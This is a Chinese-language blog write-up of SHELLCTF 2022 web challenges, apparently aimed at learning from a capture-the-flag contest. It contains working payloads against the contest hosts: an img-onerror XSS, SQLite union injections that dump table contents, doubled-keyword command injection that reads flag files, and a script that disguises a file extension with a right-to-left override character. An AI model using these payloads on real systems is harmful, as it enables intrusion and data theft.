<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SHELLCTF2022复现 | Sk1y's Blog</title><meta name="keywords" content="2022,SHELLCTF"><meta name="author" content="Sk1y"><meta name="copyright" content="Sk1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SHELLCTF2022复现Choosy Single solution doesn’t works on all problems. One should try different solutions for different problem. Flag format:- shellctf{H3re_1s_tH3_F14g} http:&#x2F;&#x2F;20.125.142.38:8324 Alterna">
<meta property="og:type" content="article">
<meta property="og:title" content="SHELLCTF2022复现">
<meta property="og:url" content="https://sk1y233.github.io/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Sk1y&#39;s Blog">
<meta property="og:description" content="SHELLCTF2022复现Choosy Single solution doesn’t works on all problems. One should try different solutions for different problem. Flag format:- shellctf{H3re_1s_tH3_F14g} http:&#x2F;&#x2F;20.125.142.38:8324 Alterna">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
<meta property="article:published_time" content="2022-08-15T15:50:53.000Z">
<meta property="article:modified_time" content="2022-08-15T15:53:59.385Z">
<meta property="article:author" content="Sk1y">
<meta property="article:tag" content="2022">
<meta property="article:tag" content="SHELLCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://sk1y233.github.io/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SHELLCTF2022复现',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-15 23:53:59'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="Sk1y's Blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/202207122029920.jpg" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312215.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Sk1y's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">SHELLCTF2022复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-08-15T15:50:53.000Z" title="发表于 2022-08-15 23:50:53">2022-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-15T15:53:59.385Z" title="更新于 2022-08-15 23:53:59">2022-08-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%AF%94%E8%B5%9Bwp/">比赛wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SHELLCTF2022复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="SHELLCTF2022复现"><a href="#SHELLCTF2022复现" class="headerlink" title="SHELLCTF2022复现"></a>SHELLCTF2022复现</h1><h2 id="Choosy"><a href="#Choosy" class="headerlink" title="Choosy"></a>Choosy</h2><blockquote>
<p>Single solution doesn’t works on all problems. One should try different solutions for different problem.</p>
<p>Flag format:- shellctf{H3re_1s_tH3_F14g}</p>
<p><a target="_blank" rel="noopener" href="http://20.125.142.38:8324/">http://20.125.142.38:8324</a></p>
<p>Alternate link <a target="_blank" rel="noopener" href="http://20.193.247.209:8333/">http://20.193.247.209:8333/</a></p>
</blockquote>
<p>这个打开之后是这样的</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505854105.png" alt="img"></p>
<p>功能是输入大写字母，返回小写字母，数字和字符不变。本来是想的是SSTI，但是怎么尝试也不行，看了wp才知道是xss</p>
<p>这个会解析html标签，但是会过滤script，可以使用img标签</p>
<p>onerror，在加载图片错误时执行javascript</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855106.png" alt="img"></p>
<p>payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855107.png" alt="img"></p>
<h2 id="Colour-Cookie"><a href="#Colour-Cookie" class="headerlink" title="Colour Cookie"></a>Colour Cookie</h2><p>题目描述：</p>
<blockquote>
<p>Gone those days when no colours, images, fonts use to be on a webpage. We now have various ways to decorate our webpages and here is one such example.</p>
<p>Flag format :- shellctf{H3re_1s_F14g}</p>
<p><a target="_blank" rel="noopener" href="http://20.125.142.38:8326/">http://20.125.142.38:8326</a></p>
<p><a target="_blank" rel="noopener" href="http://20.193.247.209:8222/">http://20.193.247.209:8222/</a></p>
</blockquote>
<p>在&#x2F;static&#x2F;base_cookie.css中找到</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*   name=&quot;C0loR&quot;  */</span></span><br></pre></td></tr></table></figure>

<p>并且题目提示<code>Blue is my favourite colour</code>，但是受题目名称影响，在cookie上下工夫了，想偏了</p>
<p>正解应该是传参<code>C0loR=Blue</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8326/check?C0loR=Blue</span></span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855108.png" alt="img"></p>
<h2 id="Extractor"><a href="#Extractor" class="headerlink" title="Extractor"></a>Extractor</h2><p>题目描述：</p>
<blockquote>
<p>We are under emergency. Enemy is ready with its nuclear weapon we need to activate our gaurds but chief who had password is dead. There is portal at URL below which holds key within super-user account, can you get the key and save us.</p>
<p>Flag format :- shellctf{H3re_1s_tH3_fL4G}</p>
<p><a target="_blank" rel="noopener" href="http://20.125.142.38:8956/">http://20.125.142.38:8956</a></p>
<p>Alternate URL :- <a target="_blank" rel="noopener" href="http://20.193.247.209:8555/">http://20.193.247.209:8555/</a></p>
<p>More Alternate URL :- <a target="_blank" rel="noopener" href="http://52.66.29.74:8999/">http://52.66.29.74:8999/</a></p>
</blockquote>
<p>有注册和登录两个功能</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855109.png" alt="img"></p>
<p>但是我测试的时候，即使不注册，也可以登录成功，不过返回的信息为空，如下</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855110.png" alt="img"></p>
<p>正常注册登录，就会返回用户注册的相关信息</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855111.png" alt="img"></p>
<p>同时注意url的变化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555&amp;pass=555&amp;content=555</span></span><br></pre></td></tr></table></figure>

<p>进行sql注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8956/profile?username=555%27--+</span></span><br></pre></td></tr></table></figure>

<p>回显</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855112.png" alt="img"></p>
<p>判断字段数为4</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855113.png" alt="img"></p>
<p>但是我想使用database()，version()来进一步测试的时候，回显错误，所以应该不是mysql</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855114.png" alt="img"></p>
<p>看师傅们的wp才知道是sqlite注入</p>
<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md</a></p>
<p>测试数据库版本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="title function_ invoke__">sqlite_version</span>()--+</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855115.png" alt="img"></p>
<p>注意3.30版本后sqlite_master才改名sqlite_schema,所以应该用sqlite_master。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,sql+FROM+sqlite_master--+</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855116.png" alt="img"></p>
<p>最后，不用区分大小写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">profile?username=<span class="number">555</span>%<span class="number">27</span>+union+select+<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,content+FROM+admins--+</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505855117.png" alt="img"></p>
<h2 id="ILLUSION"><a href="#ILLUSION" class="headerlink" title="ILLUSION"></a>ILLUSION</h2><p>考点：命令注入</p>
<p>对关键命令替换为空，可以使用双写绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//20.125.142.38:8765/wH4t_Y0u_d1d?inn=llss</span></span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856118.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;llss</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856119.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;llss</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856120.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;ccdd ....;cat flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856121.png" alt="img"></p>
<h2 id="Doc-Holder"><a href="#Doc-Holder" class="headerlink" title="Doc Holder"></a>Doc Holder</h2><p>题目描述：</p>
<blockquote>
<p>Can you share portable document with us which looks like it when we seet portable document with eyes but ti’s not actually portable document.</p>
<p>More a misc problem …</p>
<p>My Favourite move is Inferno overwrite </p>
<p><a target="_blank" rel="noopener" href="http://20.125.142.38:8508/">http://20.125.142.38:8508</a></p>
<p>Alternate Link :- <a target="_blank" rel="noopener" href="http://20.193.247.209:8666/">http://20.193.247.209:8666/</a></p>
<p>Hint — Challenge is all about file extension of the file that you are uploading….</p>
<p>Hint1: Think from right to left Hint2: Everything is just related to name and extension of file not content in file … Hint3: Give me file with name while when seen from eyes look like abc.pdf but its not actually pdf Hint4: Make file name “abc.fdp” look “abc.pdf”</p>
</blockquote>
<p>不允许文件名后缀为pdf，但是要让服务端解析为pdf</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856122.png" alt="img"></p>
<p><code>实现的方法是用控制字符，将fdp从右往左解析为pdf</code>(不清楚原理，用python测试的结果如下)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = [<span class="string">u&#x27;\u200f&#x27;</span>, <span class="string">u&#x27;\u202b&#x27;</span>, <span class="string">u&#x27;\u202e&#x27;</span>, <span class="string">u&#x27;\u2067&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    filename = <span class="string">&quot;sk1y.&quot;</span> + i + <span class="string">&quot;fdp&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(filename)</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505856123.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://20.125.142.38:8508/&#x27;</span></span><br><span class="line">filename = <span class="string">&quot;abc.&quot;</span>+<span class="string">u&#x27;\u202e&#x27;</span>+<span class="string">&quot;fdp&quot;</span></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: (filename, <span class="string">&quot;xxx&quot;</span>, <span class="string">&quot;application/pdf&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url, files=files)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857124.png" alt="img"></p>
<p>同时在burpsuite测试的时候，发现在文件名前加上字符，并且为单引号，并且后面含有<code>fdp</code>，也可以成功</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857125.png" alt="img"></p>
<p>但是用双引号就不行</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857126.png" alt="img"></p>
<p>这一点还是不太理解</p>
<p>不过需要fdp才能成功，估计也是从右往左之类的原因</p>
<h2 id="RAW-Agent"><a href="#RAW-Agent" class="headerlink" title="RAW Agent"></a>RAW Agent</h2><p>题目描述：</p>
<blockquote>
<p>Day By Day Pollution is increasing, passing polluted environment and sum of all generation till now will take you to ultimate end.</p>
<p>Flag Format :- Enclose everything in shellctf{} Flag have two part :- shellctf{part1part2}</p>
<p>Part 1 start with :- U</p>
<p>Part 2 start with :- _p</p>
<p>Challenge url :- <a target="_blank" rel="noopener" href="http://20.125.142.38:8525/">http://20.125.142.38:8525/</a></p>
<p>Alternate URL :- <a target="_blank" rel="noopener" href="http://20.193.247.209:8777/">http://20.193.247.209:8777/</a></p>
<p>More Alternate URL :- <a target="_blank" rel="noopener" href="http://52.66.29.74:8888/">http://52.66.29.74:8888/</a></p>
</blockquote>
<p>flag包括两部分，第一部分第一个字母为U，第二部分第一个字母为p</p>
<p>就是个Misc，不管了</p>
<h2 id="More-ILLUSION"><a href="#More-ILLUSION" class="headerlink" title="More ILLUSION"></a>More ILLUSION</h2><p>题目描述：</p>
<blockquote>
<p>If you still not illuded, here is another potion of illusion for you. Can you survive it ?????</p>
<p>You can <strong>du</strong> it ……..</p>
<p>Flag format :- enclose entire thing in shellctf{}</p>
<ul>
<li><p>A - Thing you got after solving problem</p>
</li>
<li><p>B - Linux command (not entire command but specific one command that lead you to solution, ex- “cd .. ; ls -la” was command that showed me thing which lead me to flag then special command is “ls” and argument is “la”)</p>
</li>
</ul>
<p>Example flag -</p>
<ul>
<li>Suppose I got string “H3re_1s_F1ag” from solving so my A &#x3D; H3re_1s_F1ag</li>
</ul>
<p>Some charaters are ommited complete the flag with all description above in below flag. ommited character corresponds to arguments of that you du.</p>
<p>After “H3re_1s_F1ag” one is special command rest are its arguments.</p>
<p>shellctf{H3re_1s_F1ag_xx_appaxxxx-xxxx_ah}</p>
<p>Challenge url :- <a target="_blank" rel="noopener" href="http://20.125.142.38:8499/">http://20.125.142.38:8499/</a></p>
<p>Alternate URL :- <a target="_blank" rel="noopener" href="http://52.66.29.74:8871/">http://52.66.29.74:8871/</a></p>
<p>More Alternate URL :- <a target="_blank" rel="noopener" href="http://20.193.247.209:8822/">http://20.193.247.209:8822/</a></p>
</blockquote>
<p>参考ek1ng师傅的解法，使用do命令</p>
<blockquote>
<p>Linux du （英文全拼：disk usage）命令用于显示目录或文件的大小。</p>
<p>du 会显示指定的目录或文件所占用的磁盘空间。</p>
<p>-a或-all 显示目录中个别文件的大小。</p>
<p>-h或–human-readable 以K，M，G为单位，提高信息的可读性。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;dduu --apparent-size -ah</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857127.png" alt="img"></p>
<p>使用<a target="_blank" rel="noopener" href="https://cyberchef.org/">https://cyberchef.org/</a> 进行整理</p>
<p>选择From HTML Entity 和 Unescape string 进行整理</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857128.png" alt="img"></p>
<p>选择一个大小为38的</p>
<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857129.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ccdd ....;<span class="built_in">cat</span> ./flag-------------/flag/flag/flag/flag/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/1660578505857130.png" alt="img"></p>
<p>包上shellctf{}即可</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>打国外的比赛还是太少了，经验不够，思路比较局限，比如第一个题目的xss，sqlite注入等等，还要继续努力学</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a target="_blank" rel="noopener" href="https://ek1ng.com/SHELLCTF2022.html">https://ek1ng.com/SHELLCTF2022.html</a></li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io">Sk1y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://sk1y233.github.io/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/">https://sk1y233.github.io/2022/08/15/SHELLCTF2022%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://sk1y233.github.io" target="_blank">Sk1y's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/2022/">2022</a><a class="post-meta__tags" href="/tags/SHELLCTF/">SHELLCTF</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312821.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2022羊城杯-Web</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/07/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='https://github.com/Sk1y233/blog-img/blob/main/images/202207121312821.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DASCTF2022.07赋能赛复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/07/12/%E8%93%9D%E5%B8%BD%E6%9D%AF2022-Web-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81/" title="蓝帽杯2022_Web_网站取证"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-12</div><div class="title">蓝帽杯2022_Web_网站取证</div></div></a></div><div><a href="/2022/07/15/2022%E5%B9%B4%E8%93%9D%E8%B4%9D%E5%9B%BD%E9%99%85%E5%88%9B%E6%96%B0%E5%88%9B%E4%B8%9A%E5%A4%A7%E8%B5%9B%E6%95%B0%E5%AD%97%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E8%B5%9B%E9%81%93%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9Bwp/" title="2022年蓝贝国际创新创业大赛数字技术+信息安全领域赛道网络攻防大赛wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-15</div><div class="title">2022年蓝贝国际创新创业大赛数字技术+信息安全领域赛道网络攻防大赛wp</div></div></a></div><div><a href="/2022/07/19/ImaginaryCTF2022-Web/" title="ImaginaryCTF2022-Web"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-19</div><div class="title">ImaginaryCTF2022-Web</div></div></a></div><div><a href="/2022/07/22/BDSecCTF2022-Web/" title="BDSecCTF2022-Web"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-22</div><div class="title">BDSecCTF2022-Web</div></div></a></div><div><a 